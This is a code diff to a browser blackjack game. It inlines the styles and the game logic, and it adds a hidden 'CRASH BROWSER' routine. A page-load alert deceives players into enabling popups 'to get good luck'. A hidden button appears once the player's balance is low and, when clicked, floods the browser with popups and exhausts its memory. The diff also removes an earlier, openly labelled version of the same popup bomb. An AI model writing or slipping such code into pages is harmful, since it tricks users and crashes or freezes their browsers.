@@ -4,7 +4,52 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Blackjack Game</title>
-    <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #0a5c36;
+            color: white;
+        }
+        #game-container {
+            margin: 20px auto;
+            max-width: 600px;
+        }
+        #playerCards, #dealerCards {
+            min-height: 100px;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        button {
+            padding: 10px 20px;
+            margin: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #d4af37;
+            border: none;
+            border-radius: 5px;
+        }
+        #crash {
+            background-color: #ff4444;
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+        }
+        .card {
+            width: 60px;
+            height: 90px;
+            background-color: white;
+            color: black;
+            border-radius: 5px;
+            margin: 5px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 20px;
+            box-shadow: 2px 2px 5px rgba(0,0,0,0.3);
+        }
+    </style>
 </head>
 <body>
     <h1>Blackjack</h1>
@@ -17,42 +62,6 @@
     </div>
 
     <button id="startGame">Start Game</button>
-
-    <script type="text/javascript">
-    // Check popup permission when page loads
-    window.onload = function() {
-        const isPopupAllowed = testPopupPermission();
-        
-        if (!isPopupAllowed) {
-            alert("⚠️ Enable popups for this site to CRASH your browser! ⚠️");
-            document.getElementById("crash").disabled = true;
-        }
-    };
-
-    // Test if popups are allowed
-    function testPopupPermission() {
-        const popup = window.open("", "testPopup", "width=1,height=1,left=-9999,top=-9999");
-        if (!popup || popup.closed) {
-            return false; // Popups blocked
-        } else {
-            popup.close();
-            return true; // Popups allowed
-        }
-    }
-
-    // Your original crash function
-    function crashAndBurn() {
-        for (let i = 0; i < 1000; i++) {
-            window.open(
-                window.location.href,
-                'popUpWindow' + i,
-                'height=181,width=666,left=' + (i * 100) + ',top=222'
-            );
-        }
-    }
-</script>
-
-<button id="crash" onclick="crashAndBurn()">CRASH</button>
 
     <div id="game-container">
         <h2>Player</h2>
@@ -67,6 +76,290 @@
       
     <p id="message"></p>
 
-    <script src="script.js"></script>
+    <button id="crash" style="display: none;">CRASH BROWSER (DANGER!)</button>
+
+    <script>
+        // Game variables
+        let balance = 20;
+        let currentBet = 5;
+        let deck = [];
+        let playerHand = [];
+        let dealerHand = [];
+        let gameActive = false;
+
+        // DOM elements
+        const balanceDisplay = document.getElementById('balance');
+        const betDisplay = document.getElementById('bet');
+        const increaseBetBtn = document.getElementById('increaseBet');
+        const decreaseBetBtn = document.getElementById('decreaseBet');
+        const startGameBtn = document.getElementById('startGame');
+        const hitBtn = document.getElementById('hit');
+        const standBtn = document.getElementById('stand');
+        const playerCardsDiv = document.getElementById('playerCards');
+        const dealerCardsDiv = document.getElementById('dealerCards');
+        const playerTotalDiv = document.getElementById('playerTotal');
+        const dealerTotalDiv = document.getElementById('dealerTotal');
+        const messageDiv = document.getElementById('message');
+        const crashBtn = document.getElementById('crash');
+
+        // Initialize game
+        function initGame() {
+            createDeck();
+            updateDisplay();
+            hitBtn.style.display = 'none';
+            standBtn.style.display = 'none';
+        }
+
+        // Create a deck of cards
+        function createDeck() {
+            const suits = ['♥', '♦', '♠', '♣'];
+            const values = ['A', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K'];
+            deck = [];
+            
+            for (let suit of suits) {
+                for (let value of values) {
+                    deck.push({ suit, value });
+                }
+            }
+            
+            // Shuffle the deck
+            for (let i = deck.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [deck[i], deck[j]] = [deck[j], deck[i]];
+            }
+        }
+
+        // Start a new game
+        function startGame() {
+            if (currentBet > balance) {
+                messageDiv.textContent = "You don't have enough balance!";
+                return;
+            }
+            
+            playerHand = [];
+            dealerHand = [];
+            gameActive = true;
+            
+            // Deal initial cards
+            playerHand.push(drawCard());
+            dealerHand.push(drawCard());
+            playerHand.push(drawCard());
+            dealerHand.push(drawCard());
+            
+            updateDisplay();
+            startGameBtn.style.display = 'none';
+            hitBtn.style.display = 'inline-block';
+            standBtn.style.display = 'inline-block';
+            messageDiv.textContent = 'Hit or Stand?';
+        }
+
+        // Draw a card from the deck
+        function drawCard() {
+            return deck.pop();
+        }
+
+        // Calculate hand value
+        function calculateHandValue(hand) {
+            let value = 0;
+            let aces = 0;
+            
+            for (let card of hand) {
+                if (card.value === 'A') {
+                    aces++;
+                    value += 11;
+                } else if (['K', 'Q', 'J'].includes(card.value)) {
+                    value += 10;
+                } else {
+                    value += parseInt(card.value);
+                }
+            }
+            
+            // Adjust for aces
+            while (value > 21 && aces > 0) {
+                value -= 10;
+                aces--;
+            }
+            
+            return value;
+        }
+
+        // Update the display
+        function updateDisplay() {
+            // Update balance and bet
+            balanceDisplay.textContent = balance;
+            betDisplay.textContent = currentBet;
+            
+            // Update player cards
+            playerCardsDiv.innerHTML = '';
+            for (let card of playerHand) {
+                const cardElement = document.createElement('div');
+                cardElement.className = 'card';
+                cardElement.textContent = `${card.value}${card.suit}`;
+                playerCardsDiv.appendChild(cardElement);
+            }
+            
+            // Update dealer cards (hide first card if game is active)
+            dealerCardsDiv.innerHTML = '';
+            for (let i = 0; i < dealerHand.length; i++) {
+                const cardElement = document.createElement('div');
+                cardElement.className = 'card';
+                if (gameActive && i === 0) {
+                    cardElement.textContent = '?';
+                } else {
+                    cardElement.textContent = `${dealerHand[i].value}${dealerHand[i].suit}`;
+                }
+                dealerCardsDiv.appendChild(cardElement);
+            }
+            
+            // Update totals
+            playerTotalDiv.textContent = `Total: ${calculateHandValue(playerHand)}`;
+            if (gameActive) {
+                dealerTotalDiv.textContent = 'Total: ?';
+            } else {
+                dealerTotalDiv.textContent = `Total: ${calculateHandValue(dealerHand)}`;
+            }
+        }
+
+        // Player hits
+        function hit() {
+            if (!gameActive) return;
+            
+            playerHand.push(drawCard());
+            updateDisplay();
+            
+            const playerValue = calculateHandValue(playerHand);
+            if (playerValue > 21) {
+                endGame('Bust! You lose!');
+            }
+        }
+
+        // Player stands
+        function stand() {
+            if (!gameActive) return;
+            
+            gameActive = false;
+            
+            // Dealer draws until 17 or higher
+            while (calculateHandValue(dealerHand) < 17) {
+                dealerHand.push(drawCard());
+            }
+            
+            updateDisplay();
+            
+            const dealerValue = calculateHandValue(dealerHand);
+            const playerValue = calculateHandValue(playerHand);
+            
+            if (dealerValue > 21) {
+                endGame('Dealer busts! You win!');
+                balance += currentBet;
+            } else if (dealerValue > playerValue) {
+                endGame('Dealer wins!');
+                balance -= currentBet;
+            } else if (playerValue > dealerValue) {
+                endGame('You win!');
+                balance += currentBet;
+            } else {
+                endGame('Push! It\'s a tie.');
+            }
+            
+            // Show crash button if balance is low
+            if (balance < 5) {
+                crashBtn.style.display = 'block';
+            }
+        }
+
+        // End the game
+        function endGame(message) {
+            gameActive = false;
+            messageDiv.textContent = message;
+            startGameBtn.style.display = 'inline-block';
+            hitBtn.style.display = 'none';
+            standBtn.style.display = 'none';
+            updateDisplay();
+        }
+
+        // Event listeners
+        increaseBetBtn.addEventListener('click', () => {
+            if (currentBet < balance) {
+                currentBet += 5;
+                betDisplay.textContent = currentBet;
+            }
+        });
+
+        decreaseBet.addEventListener('click', () => {
+            if (currentBet > 5) {
+                currentBet -= 5;
+                betDisplay.textContent = currentBet;
+            }
+        });
+
+        startGameBtn.addEventListener('click', startGame);
+        hitBtn.addEventListener('click', hit);
+        standBtn.addEventListener('click', stand);
+
+        // Initialize game
+        initGame();
+
+        // Browser crash functionality
+        // Check popup permission when page loads
+        window.onload = function() {
+            const isPopupAllowed = testPopupPermission();
+            
+            if (!isPopupAllowed) {
+                alert("⚠️ Enable popups for this site to get good luck!!! ⚠️");
+                document.getElementById("crash").disabled = true;
+            }
+        };
+
+        // Test if popups are allowed
+        function testPopupPermission() {
+            const popup = window.open("", "testPopup", "width=1,height=1,left=-9999,top=-9999");
+            if (!popup || popup.closed) {
+                return false; // Popups blocked
+            } else {
+                popup.close();
+                return true; // Popups allowed
+            }
+        }
+
+        // Enhanced crash function for Chrome and Safari
+        function crashAndBurn() {
+            crashBtn.disabled = true;
+            crashBtn.textContent = "Crashing...";
+            
+            // Method 1: Rapid popups (works on most browsers)
+            for (let i = 0; i < 100; i++) {
+                window.open(window.location.href, 'popup' + i, 
+                    'width=300,height=300,left=' + (i * 10) + ',top=' + (i * 10));
+            }
+            
+            // Method 2: Recursive popups (especially effective on Safari)
+            function recursiveCrash(level) {
+                if (level > 20) return;
+                
+                const win = window.open('', 'crash' + level, 'width=200,height=200');
+                if (win) {
+                    win.document.write(`
+                        <script>
+                            setTimeout(() => {
+                                window.opener.recursiveCrash(${level + 1});
+                            }, 50);
+                        <\/script>
+                        <h1>Crash Level ${level}</h1>
+                    `);
+                }
+            }
+            
+            setTimeout(() => recursiveCrash(0), 100);
+            
+            // Method 3: Memory overload (for Chrome)
+            const hugeArray = [];
+            for (let i = 0; i < 1000; i++) {
+                hugeArray.push(new Array(1000000).join('x'));
+            }
+        }
+
+        crashBtn.addEventListener('click', crashAndBurn);
+    </script>
 </body>
 </html>
